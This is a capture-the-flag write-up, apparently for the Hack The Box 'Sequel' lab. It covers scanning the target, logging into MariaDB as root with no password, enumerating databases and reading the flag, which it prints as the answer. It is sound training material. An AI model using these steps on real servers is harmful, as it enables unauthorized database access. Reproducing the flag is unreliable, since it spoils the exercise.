## 📂 Evidence – Sequel (MariaDB)

---

## 🔎 Recon

### ▶️ Ping

```bash
ping -c 4 10.129.82.104
64 bytes from <IP>: icmp_seq=1 ttl=63 time=24.1 ms
64 bytes from <IP>: icmp_seq=2 ttl=63 time=24.4 ms
64 bytes from <IP>: icmp_seq=3 ttl=63 time=24.5 ms
64 bytes from <IP>: icmp_seq=4 ttl=63 time=24.5 ms
```

---

### ▶️ Nmap Scan

```bash
sudo nmap -sV -sC <IP>
```

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql 5.5.5-10.3.27-MariaDB-0+deb10u1
```

---

## 🛠️ Local Setup

### ▶️ Installing MySQL/MariaDB packages

```bash
sudo apt update && sudo apt install mysql*
```

---

### ▶️ Attempt: MySQL client (failed)

```bash
mysql -h <IP> -u root
```

```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

---

### ▶️ Successful connection via MariaDB client

```bash
sudo mariadb -h 10.129.82.104 -u root --skip-ssl
```

```
Welcome to the MariaDB monitor.
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
```

---

## 🧭 SQL Enumeration

### ▶️ Show databases

```sql
SHOW databases;
```

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

---

### ▶️ Select database

```sql
USE htb;
```

---

### ▶️ Show tables

```sql
SHOW tables;
```

```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

---

### ▶️ Read `config` table

```sql
SELECT * FROM config;
```

```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+
```

---

## 🎯 Final Result

```
7b4bec00d1a39e3dd4e021ec3d915da8
```
